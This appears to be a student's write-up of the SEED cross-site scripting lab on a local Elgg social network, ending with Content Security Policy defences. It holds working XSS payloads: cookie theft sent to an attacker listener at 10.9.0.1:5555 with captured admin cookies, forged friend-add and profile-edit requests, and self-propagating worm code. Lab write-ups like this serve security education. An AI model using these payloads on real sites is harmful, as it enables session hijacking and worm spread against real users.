# Cross-site Scripting Attack Lab
- Cross-site Scripting (XSS) is a type of vulnerability commonly found in web applications. XSS makes it possible for attackers to inject malicious code (e.g., JavaScript programs) into victim's web browser, and steal a victim's credentials, such as session cookies. The access control policies (i.e., the same origin policy) employed by browsers to protect those credentials can be bypassed by exploiting XSS vulnerabilities
- topics
    - XSS attack
    - XSS worm and self-propagation
    - Session cookies
    - HTTP GET and POST requests
    - JavaScript and Ajax
    - Content Security Policy (CSP)

## Lab Setup
- DNS Setup: add some entries to `/etc/hosts`
    ```
    10.9.0.5        www.seed-server.com
    10.9.0.5        www.example32a.com
    10.9.0.5        www.example32b.com
    10.9.0.5        www.example32c.com
    10.9.0.5        www.example60.com
    10.9.0.5        www.example70.com
    ```
- web application: `Elgg`, a web-based social-networking application

## Preparation: Getting Familiar with the "HTTP Header Live" tool
- we need to capture, analyze, and construct HTTP requests in this lab
- use a Firefox add-on called `HTTP Header Live`

## Task 1: Posting a Malicious Message to Display an Alert Window
- objective: embed a JS program in our `Elgg` profile, such that when antoher user views our profile, the JS program will be executed and an alert window will be displayed
- use this JS program: `<script>alert('XSS');</script>`
- login with Alice's account, user name: `aclie`, password: `seedalice`
- Edit profile, and put the code in the brief description
- Go to the profile page, an alert is prompted
- if the JS program is too long, we can store the program in a standalone file, save it with `.js` extension, and then refer to it using the `src` attribute in the `<script>` tag
    ```
    <script type="text/javascript"
            src="http://www.example.com/myscripts.js">
    </script>
    ```

## Task 2: Posting a Malicious Message to Display Cookies
- use `<script>alert(document.cookie);</script>`
- then the script will print out the cookie: `Elgg=ugsb0ln5ip0ng59ftrph6nlvhb`

## Task 3: Stealing Cookies from the Victim's Machine
- in previous task, the attacker can print out the user's cookies, but only the user can see their own cookies, in this task, we want the JS code to send the cookies to us, e.g., the JS code needs to send an HTTP request to the attacker, with the cookies appended to the request
- we can do this by having the malicious JS insert an `<img>` tag with its `src` attribute set to the attacker's machine, when the JS insert the `img` tag, the browser tries to load the image from the URL in the `src` field, this result in an HTTP GET request sent to the attacker's machine
- code, `escape` is used to encode a string by replacing certain characters, e.g., spaces, punctuation, and non-ASCII characters with `%` followed by two hexadecimal digits
    ```
    <script>
        document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>');
    </script>
    ```
- on the attacker machine: `nc -lknv 5555`, this makes the attacker machine a TCP server that listens for a connection on port `5555`
    - `-l` listen
    - `-nv` give more verbose output
    - `-k` when a connection is completed, listen for another one

- after injecting the code into Alice's profile, login as admin (user name `admin`, password `seedadmin`), and open Alice's profile, we will see the following content on the attacker's machine, we can see that the admin's cookie is `Elgg=o66op359c58nrdshhjg1qurb3e`
    ```
    Connection received on 10.0.2.15 35640
    GET /?c=Elgg%3Do66op359c58nrdshhjg1qurb3e HTTP/1.1
    Host: 10.9.0.1:5555
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
    Accept: image/webp,*/*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://www.seed-server.com/profile/alice
    Connection: keep-alive
    ```

## Task 4: Becoming the Victim's Friend
- this attack is similar to what Samy did to MySpace in 2005 (i.e., the Samy Worm), we will write an XSS worm that adds Samy as a friend to any other user that visits Samy's page, this worm doesn't self-propagate, but in task 6 it does
- write a JS program that forges HTTP requests directly from the victim's browser
- use HTTP Header Live to see what are sent to the server when a user adds a friend, it is actually a GET request with some parameters in the URL (the duplicated fields removed), this is what the URL looks like when Samy adds Charlie
    - `http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1707036879&__elgg_token=yZAhDB7Dz7s7oA7LwQjmhA` 
- login as Alice and add Charlie
    - `http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1707037676&__elgg_token=Gf3XT1cdnWD_wIQy4idzBQ`

- we can find that the parameter `friend` is the number of the user who is added (it is `59` for Samy, `58` for Charlie), but `__elgg_ts` and `__elgg_token` are changing, to launch the attack, we need to find a way to get the value of `__elgg_ts` and `__elgg_token` in the code
- if we inspect the element of the page, we can find `__elgg_ts` and `__elgg_token` in the `security.token` field of the variable `elgg`, so we can get their value using `elgg.security.__elgg_token` and `elgg.security.__elgg_ts`
- the malicious code
    ```
    <script type="text/javascript">
        window.onload = function () {
            var Ajax=null;
            var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
            var token="&__elgg_token="+elgg.security.token.__elgg_token;
            var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token;
            Ajax=new XMLHttpRequest();
            Ajax.open("GET", sendurl, true);
            Ajax.send();
        }
    </script>
    ```
- login as another user, e.g., Charlie, then open Samy's profile, and refresh the page, we can see that Charlie becomes a friend of Samy

- what if the web application only provide the Editor mode for the `About Me` field, i.e., we cannot switch to the Text mode, can we still launch a sucessful attack?
    - if we directly put the code in `About Me` field, it will not work
    - after entering some content, e.g., `<script>`, click save, and we can see the data in the request body using HTTP Header Live, it's `%ltscript%gt`, this means that some HTML special characters are encoded, e.g., `<` -> `%lt`, `>` -> `%gt`
    - this is an effective countermeasure for XSS attack
## Task 5: Modifying the Victim's Profile
- objective: modify the victim's profile when the victime visits Samy's page (Specifically, the `About Me` field)
- login as Samy, edit the profile, input `7777` in `About Me` field, then save, by using HTTP Header Live, we can find the request, it is a POST request
    - request URL: `http://www.seed-server.com/action/profile/edit`
    - data in the request body
        ```
        __elgg_token=XI904ZLJZyFQND80lxnwyw&__elgg_ts=1707043935&name=Samy&description=<p>777777777777</p> &accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=59
        ```
    - edit the data as follows, and resend the request, we successfully modified the `About Me` field, this means we only need to include these parameters in the forged request
        ```
        __elgg_token=XI904ZLJZyFQND80lxnwyw&__elgg_ts=1707043935&name=Samy&description=<p>123</p> &guid=59
        ```
    - put the malicious JS code in Samy's profile
        ```
        <script type="text/javascript">
            window.onload = function () {
                var userName="&name="+elgg.session.user.name;
                var guid="&guid="+elgg.session.user.guid;
                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
                var token="&__elgg_token="+elgg.security.token.__elgg_token;
                var sendurl="http://www.seed-server.com/action/profile/edit";
                
                var content="description=<p>MODIFIED!</p>"+ts+token+guid+userName;
                var samyGuid=59;
                
                if(elgg.session.user.guid!=samyGuid) {
                    var Ajax=null;
                    Ajax=new XMLHttpRequest();
                    Ajax.open("POST", sendurl, true);
                    Ajax.setRequestHeader("Content-Type", 
                                "application/x-www-form-urlencoded");
                    Ajax.send(content);
                }
            }
        </script>
        ```
    - login as Alice, visit Samy's profile, then we can find that Alice's About Me is `MODIFIED!`

## Task 6: Writing a Self-Propagating XSS Worm
- a real worm should be able to propagate itself, namely, whenever some people view an infected profile, not only will their profiles be modified, the worm will also be propagated to their profiles, further affecting others who view these newly infected profiles
- this is exactly the same mechanism used by the Samy Sworm, the JS code that can achieve this is called a *self-propagating cross-site scripting worm*
- when the malicious JS code modifies the victim's profile, it should copy itself to the victim's profile, there are several approaches, 2 common approaches are:
    1. **Link Approach**: if the worm is included using the `src` attribute in the `<script>` tag, writing self-propagating worms is much easier
        - payload `<script type="text/javascript" src="http://10.9.0.1:9875/worm_link.js"></script>`
        - inside `worm_link.js`, it will modify the `About Me` of the victim to a text `<p>INFECTED!</p>` and the payload
    2. **DOM Approach**: if the entire JS code is embedded in the infected profile, to propagate, the worm code can use DOM APIs to retrieve a copy of itself from the webpage
        ```
        var headerTag="<script id=\"worm\" type=\"text/javascript\">";
        var jsCode=document.getElementById("worm").innerHTML;
        var tailTag="</" + "script>";
        var wormCode=encodeURIComponent(headerTag+jsCode+tailTag);
        ```

### Elgg's Countermeasures
- one is a custom built security plugin `HTMLawed`, it validates the user input and removes the tags from the input
- PHP's built-in method `htmlspecialchars()`, it encode the special characters in user input, e.g., `<` to `&lt`, `>` to `&gt`, etc

## Task 7: Defeating XSS Attacks Using CSP
- the fundamental problem of the XSS vulnerability is that HTML allows JavaScript code to be mixed with data. Therefore, to fix this problem, we need to separate code from data
- there are 2 ways to include JS code inside an HTML page, one is the inline approach (directly places code inside the page), and the other is the link approach (puts the code in an external file, and then link to it from inside the page)
- the inline approach is the culprit of the problem, in link approach, websites can tell browsers which sources are trustworthy, and attacker cannot place code in thos trustworthy places
- Content Security Policy (CSP) is a mechanism designed to defeat XSS and ClickJacking attacks. It not only restricts JS code, it also restricts other page contents, such as limiting where pictures, audio, and video can come from, as well as whether a page can be put inside an iframe or not

### Experiment website setup
- in `Labsetup/image_www` there is a file `apache_csp.conf`, it defines five websites, which share the same folder, but they uses different files in this folder
    - `example60`, `example70`, used for hosting JS code
    - `example32a`, `example32b`, `example32c`, three websites with different CSP configurations
- after changing configuration inside container (`/etc/apache2/sites-available`), run `service apache2 restart`

### Setting CSP Policies
- there are 2 typical ways to set the header
    1. by the web server (such as Apache)
        - Apache can set HTTP headers for all the responses
            ```
            Header set Content-Security-Policy " \
                    default-src 'self'; \
                    script-src 'self' *.example70.com \
            "
            ```
    2. by the web application
        - the entry of the third `VritualHost` is `phpindex.php`, we can make the program to add CSP header to the response 
            ```
            <?php
                $cspheader = "Content-Security-Policy:".
                             "default-src 'self'".
                             "script-src 'self' 'nonce-111-111-111' *example70.com".
                             "";
            ?>
            ```
### Tasks
- visit `http://www.example32a.com`, `http://www.example32b.com`, `http://www.example32c.com`, click the button `Click me` to try execute the JS code, only in `a` the JS will be executed, because when clicking the button, it tries to execute an inline script, in `b`, all inline scripts are disallowed, in `c`, inline scripts can be executed only when their `nonce` is `111-111-111`
- in `b`, all inline scripts cannot be executed, in `c`, inline scripts with `nonce-111-111-111` (i.e., `<script nonce="111-111-111"></script>`) can be executed
- change the Apache configuration on `b`, so Area 5 and 6 display OK
    ```
    Header set Content-Security-Policy " \
                    default-src 'self'; \
                    script-src *.example70.com *.example60.com \
            "
    ```
- change the PHP configuration on `c`, so that Area 1, 2, 4, 5, and 6 all display OK
    ```
    <?php
        $cspheader = "Content-Security-Policy:".
                     "default-src 'self'".
                     "script-src 'self' 'unsafe-inline' *example70.com *example60.com".
                     "";
    ?>
    ```

- why CSP helps prevent XSS: becasue the website can control what scripts can be executed on the server, e.g., it can allow only scripts from the sever itself to be executed, and disable all inline scripts, in this case, if attacker embeds the JS code in its profile, it will be inline code, if the attacker injected a link script, it is from the attacker's server, not the victim server, in both cases, the malicious code won't get executed
